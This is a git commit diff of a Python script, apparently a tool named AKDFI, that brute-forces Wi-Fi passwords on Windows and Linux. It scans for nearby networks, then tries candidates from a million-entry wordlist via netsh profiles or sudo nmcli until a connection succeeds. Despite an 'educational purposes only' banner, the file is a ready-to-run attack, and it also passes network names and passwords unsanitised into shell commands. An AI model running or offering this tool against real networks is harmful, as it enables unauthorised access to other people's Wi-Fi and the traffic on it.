78ef21e6e17520ed5252b0aa8424727e55582f28
Adarsh kumar <akdubay45@gmail.com>
2022-08-27 03:12:49 +0530

    Update main.py
    Now it can also work with windows.

--- main.py
+++ main.py
@@ -1,7 +1,10 @@
 import os
+import time
+import platform
+import sys
 print("\n*****************************************************************")
-print("\n* AKDFI                                                         *")
-print("\n* Version 1.00                                                  *")
+print("\n* AKDFI  --Windows/Linux                                        *")
+print("\n* Version 1.1                                                   *")
 print("\n*****************************************************************")
 print("\n*****************************************************************")
 print("\n* Copyright of AKD, 2022                                        *")
@@ -13,21 +16,91 @@ print("\n* It is not programmed to cater for all situations.             *")
 print("\n* This code is provided for educational purposes only.          *")
 print("\n* Do good. Be Ethical. Happy Hacking                            *")
 print("\n*****************************************************************")
-
-os.system("sudo nmcli d wifi list ifname wlp2s0 " )
-wifiname=input("select the wifi you want to bruteforce")
-password_list=[]
-listfile=open("wordlists/10-million-password-list-top-1000000.txt","r")
-for fill in listfile:
-        password_list.append(fill.replace("\n",""))
-for word in password_list:
-                print(f"trying {word} as password ")
-                os.system(f"sudo nmcli d wifi connect {wifiname} password {word} ifname wlp2s0 > con.txt")
-                passcheek=open("con.txt","r")
-                passcheek=passcheek.read()
-                if "successfully" in passcheek:
-                                print("Password cracked")
-                                print(f"Password of '{wifiname}' is '{word}'")
-                                exit()
-                else:
-                        print(f"{word} was not the password")
+if platform.system() == 'Windows':
+    def createprofile(name, password):
+        config = """<?xml version=\"1.0\"?>
+    <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
+    	<name>"""+name+"""</name>
+    	<SSIDConfig>
+    		<SSID>
+    			<name>"""+name+"""</name>
+    		</SSID>
+    	</SSIDConfig>
+    	<connectionType>ESS</connectionType>
+    	<connectionMode>auto</connectionMode>
+    	<MSM>
+    		<security>
+    			<authEncryption>
+    				<authentication>WPA2PSK</authentication>
+    				<encryption>AES</encryption>
+    				<useOneX>false</useOneX>
+    			</authEncryption>
+    			<sharedKey>
+    				<keyType>passPhrase</keyType>
+    				<protected>false</protected>
+    				<keyMaterial>"""+password+"""</keyMaterial>
+    			</sharedKey>
+    		</security>
+    	</MSM>
+    </WLANProfile>"""
+        command = f"netsh wlan add profile filename={name}.xml interface=Wi-Fi > .creatxml"
+        with open(name+".xml", 'w') as file:
+            file.write(config)
+        os.system(command)
+    def connect(name,password):
+        command = f"netsh wlan connect name={name} ssid={name} interface=Wi-Fi > .connect "
+        os.system(command)
+        print(f"trying {password} for {name}")
+        time.sleep(5)
+        os.system("ping 8.8.8.8 -n 1 > .ping.txt")
+        cheek=open(".ping.txt","r")
+        cheek=cheek.read()
+        if "Destination host unreachable" in cheek or " transmit failed" in cheek or "General failure" in cheek or "100% loss" in cheek:
+            print()
+        else:
+            print(f"{password} is password for {name}")
+            os.system(f"del .connect .ping.txt .creatxml {name}.xml")
+            sys.exit()
+    def displayAvailableNetworks():
+    	command = """netsh wlan show networks interface=Wi-Fi | find "SSID" """
+    	os.system(command)
+    if __name__=="__main__":
+        try:
+            displayAvailableNetworks()
+            name = input("Name of Wi-Fi: ")
+            if name=="":
+                print("No name provide")
+                exit()
+            password_list=[]
+            listfile=open("wordlists/10-million-password-list-top-1000000.txt","r")
+            for fill in listfile:
+                    password_list.append(fill.replace("\n",""))
+            for password in password_list:
+                    if len(password)>=8:
+                        createprofile(name, password)
+                        connect(name, password)
+        except KeyboardInterrupt:
+            print("\nExitting... 'Ctrl + c'")
+            sys.exit()
+if platform.system() == 'Linux':        
+    os.system("sudo nmcli d wifi list ifname wlp2s0 " )
+    wifiname=input("select the wifi you want to bruteforce")
+    if wifiname=="":
+        print("No name provide")
+        sys.exit()
+    password_list=[]
+    listfile=open("wordlists/10-million-password-list-top-1000000.txt","r")
+    for fill in listfile:
+        if len(fill)>=8:
+            password_list.append(fill.replace("\n",""))
+    for word in password_list:
+                    print(f"trying {word} as password ")
+                    os.system(f"sudo nmcli d wifi connect {wifiname} password {word} ifname wlp2s0 > con.txt")
+                    passcheek=open("con.txt","r")
+                    passcheek=passcheek.read()
+                    if "successfully" in passcheek:
+                                    print("Password cracked")
+                                    print(f"Password of '{wifiname}' is '{word}'")
+                                    sys.exit()
+                    else:
+                            print(f"{word} was not the password")
